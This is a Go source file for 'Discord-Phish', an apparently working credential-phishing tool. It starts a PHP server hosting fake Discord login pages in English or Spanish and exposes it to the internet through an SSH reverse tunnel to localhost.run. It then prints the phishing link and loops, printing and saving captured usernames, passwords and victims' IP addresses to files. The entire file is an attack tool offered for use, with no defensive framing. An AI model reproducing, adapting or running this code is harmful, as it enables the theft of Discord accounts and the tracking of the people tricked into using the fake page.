// Discord-Phish
// By: Euronymou5
// https://twitter.com/Euronymou51
// https://github.com/Euronymou5

package main

import (
    "fmt"
    "os/exec"
    "regexp"
    "os"
    "io/ioutil"
    "log"
    "time"
)

func clear() {
    com := "clear"
    cmd := exec.Command(com)
    cmd.Stdout = os.Stdout
    cmd.Run()
}

func cat(file string) string {
	if _, err := os.Stat(file); os.IsNotExist(err) {
		return ""
	}
	data, err := ioutil.ReadFile(file)
	if err != nil {
		return ""
	}
	return string(data)
}

func grep(regex, target string) string {
	var content string
	if _, err := os.Stat(target); os.IsNotExist(err) {
		content = target
	} else {
		content = cat(target)
	}
	r := regexp.MustCompile(regex)
	results := r.FindStringSubmatch(content)
	if len(results) > 1 {
		return results[1]
	}
	return ""
}

func bgtask(command string, stdout *os.File, stderr *os.File, cwd string) *exec.Cmd {
    cmd := exec.Command("sh", "-c", command)
    cmd.Stdout = stdout
    cmd.Stderr = stderr
    cmd.Dir = cwd

    if err := cmd.Start(); err != nil {
        log.Fatal(err)
    }

    return cmd
}

func setup(ey string) {
	clear()
	cfFile := "logs/lh.log"
	cfLog, lol := os.Create(cfFile)
	if lol != nil {
		log.Fatal(lol)
	}
	defer cfLog.Close()
	logo := `
 _____ _                       _       ______ _     _     _     
|  _  (_)                     | |      | ___ \ |   (_)   | |    
| | | |_ ___  ___ ___  _ __ __| |______| |_/ / |__  _ ___| |__  
| | | | / __|/ __/ _ \| '__/ _  |______|  __/| '_ \| / __| '_ \ 
| |/ /| \__ \ (_| (_) | | | (_| |      | |   | | | | \__ \ | | |
|___/ |_|___/\___\___/|_|  \__,_|      \_|   |_| |_|_|___/_| |_|
                  By: Euronymou5
        `
	fmt.Println("\033[33m" + logo)
	fmt.Println("\033[34m[~] Starting php server...")
        fmt.Println("[~] Port: 8080")
	cfUrl := ""
	time.Sleep(2 * time.Second)
	if ey == "ingles" {
		setup_en := exec.Command("php", "-S", "localhost:8080", "-t", "pages/discord_en")
		errol := setup_en.Start()
		if errol != nil {
			fmt.Println("\033[31m[!] Error starting PHP server:", errol)
			return
		}
		bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", cfLog, cfLog, ".")
		for i := 0; i < 10; i++ {
			cfUrl += grep("(https://[-0-9a-z.]*.lhr.life)", cfFile)
			if cfUrl != "" {
				break
			}
			time.Sleep(1 * time.Second)
		}
		fmt.Println("\033[32m[~] Link: ", cfUrl)
		fmt.Println("\033[36m[~] Waiting for user interaction...")
		for {
			if _, err := os.Stat("pages/discord_en/users.txt"); err == nil {
				fmt.Println("\n\033[31m[!] Users found!")
				fmt.Println("\033[92m")
				filedata, _ := ioutil.ReadFile("pages/discord_en/users.txt")
				fmt.Print(string(filedata))
				filedata, _ = ioutil.ReadFile("pages/discord_en/users.txt")
				f, _ := os.OpenFile("pages/discord_en/users_saved.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				defer f.Close()
				f.WriteString(string(filedata))
				os.Remove("pages/discord_en/users.txt")
				fmt.Println("\n\033[34m[~] Users saved in: users_saved.txt")
			}
			if _, err := os.Stat("pages/discord_en/ip.txt"); err == nil {
				fmt.Println("\n\033[31m[!] IP Found!")
				fmt.Println("\033[31m")
				filedata, _ := ioutil.ReadFile("pages/discord_en/ip.txt")
				fmt.Print(string(filedata))
				f, _ := os.OpenFile("pages/discord_en/ip_saved.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				defer f.Close()
				f.WriteString(string(filedata))
				os.Remove("pages/discord_en/ip.txt")
				fmt.Println("")
				fmt.Println("\n\033[34m[~] IP saved in: ip_saved.txt")
			}
		}
	} else if ey == "espain" {
		command := exec.Command("php", "-S", "localhost:8080", "-t", "pages/discord_es")
		err := command.Start()
		if err != nil {
			fmt.Println("\033[31m[!] Error starting PHP server:", err)
			return
		}
		bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", cfLog, cfLog, ".")
		for i := 0; i < 10; i++ {
			cfUrl += grep("(https://[-0-9a-z.]*.lhr.life)", cfFile)
			if cfUrl != "" {
				break
			}
			time.Sleep(1 * time.Second)
		}
		fmt.Println("\033[32m[~] Link: ", cfUrl)
		fmt.Println("\033[36m[~] Waiting for user interaction...")
		for {
			if _, err := os.Stat("pages/discord_es/users.txt"); err == nil {
				fmt.Println("\n\033[31m[!] Users found!")
				fmt.Println("\033[92m")
				filedata, _ := ioutil.ReadFile("pages/discord_es/users.txt")
				fmt.Print(string(filedata))
				filedata, _ = ioutil.ReadFile("pages/discord_es/users.txt")
				f, _ := os.OpenFile("pages/discord_es/users_saved.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				defer f.Close()
				f.WriteString(string(filedata))
				os.Remove("pages/discord_es/users.txt")
				fmt.Println("\n\033[34m[~] Users saved in: users_saved.txt")
			}
			if _, err := os.Stat("pages/discord_es/ip.txt"); err == nil {
				fmt.Println("\n\033[31m[!] IP Found!")
				fmt.Println("\033[31m")
				filedata, _ := ioutil.ReadFile("pages/discord_es/ip.txt")
				fmt.Print(string(filedata))
				f, _ := os.OpenFile("pages/discord_es/ip_saved.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				defer f.Close()
				f.WriteString(string(filedata))
				os.Remove("pages/discord_es/ip.txt")
				fmt.Println("")
				fmt.Println("\n\033[34m[~] IP saved in: ip_saved.txt")
			}
		}
	}
}

func main() {
	clear()
	kill := exec.Command("killall", "php")
	kill_run := kill.Start()
	if kill_run != nil {
		;
	}
	logo := `
 _____ _                       _       ______ _     _     _     
|  _  (_)                     | |      | ___ \ |   (_)   | |    
| | | |_ ___  ___ ___  _ __ __| |______| |_/ / |__  _ ___| |__  
| | | | / __|/ __/ _ \| '__/ _  |______|  __/| '_ \| / __| '_ \ 
| |/ /| \__ \ (_| (_) | | | (_| |      | |   | | | | \__ \ | | |
|___/ |_|___/\___\___/|_|  \__,_|      \_|   |_| |_|_|___/_| |_|
               By: Euronymou5
        `
	fmt.Println("\033[33m" + logo)
        fmt.Println("\033[34m[1] Use template in Spanish")
        fmt.Println("[2] Use template in English")
	fmt.Println("[99] Exit")
	var elegir int
	fmt.Println(" ")
	fmt.Print(">> ")
        fmt.Scan(&elegir)
        switch elegir {
        case 1:
           ey := "espain"
	   setup(ey)
        case 2:
           ey := "ingles"
	   setup(ey)
	case 99:
	   os.Exit(0)
        default:
           fmt.Println("\033[31m[!] Invalid option.")
	   main()
    }
}
